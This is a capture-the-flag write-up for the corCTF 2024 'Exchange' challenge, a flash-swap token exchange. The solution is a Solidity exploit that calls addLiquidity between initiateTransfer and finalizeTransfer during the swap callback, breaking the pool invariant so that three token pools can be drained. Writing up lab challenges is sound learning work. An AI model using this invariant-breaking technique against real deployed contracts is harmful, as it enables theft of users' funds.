# corCTF 2024: Exchange

## Description

```
I upgraded my exchange to support flash swaps! Check it out. nc be.ax 32412
```

## Solution 

Instead of executing a transfer between `initialTransfer` and `finalizeTransfer`, it's possible to execute `addLiquidity`.

This can disrupt the pool's invariant.
By increasing the amount of one of the tokens in the pool, we can obtain the other token at a favorable rate.

I solved this challenge by executing the following during `doSwap`, and it was the first blood.

```solidity
token1.approve(address(exchange), type(uint256).max);
token2.approve(address(exchange), type(uint256).max);
token3.approve(address(exchange), type(uint256).max);

for (uint256 i = 0; i < 30; i++) {
    exchange.withdraw(address(token2), 200_000);
    exchange.initiateTransfer(address(token2));
    exchange.addLiquidity(address(token1), address(token2), 0, 200_000);
    exchange.finalizeTransfer(address(token2));
}
exchange.swapTokens(address(token1), address(token2), 10_000, 400_000);

for (uint256 i = 0; i < 50; i++) {
    exchange.withdraw(address(token1), 200_000);
    exchange.initiateTransfer(address(token1));
    exchange.addLiquidity(address(token2), address(token1), 0, 200_000);
    exchange.finalizeTransfer(address(token1));
}
exchange.swapTokens(address(token2), address(token1), 200_000, 240_000); // 200_000 + 10_000 + 30_000

for (uint256 i = 0; i < 50; i++) {
    exchange.withdraw(address(token3), 400_000);
    exchange.initiateTransfer(address(token3));
    exchange.addLiquidity(address(token1), address(token3), 0, 400_000);
    exchange.finalizeTransfer(address(token3));
}
exchange.swapTokens(address(token1), address(token3), 30_000, 400_000);

exchange.withdraw(address(token1), 200_000);
exchange.withdraw(address(token2), 200_000);
exchange.withdraw(address(token3), 400_000);
```
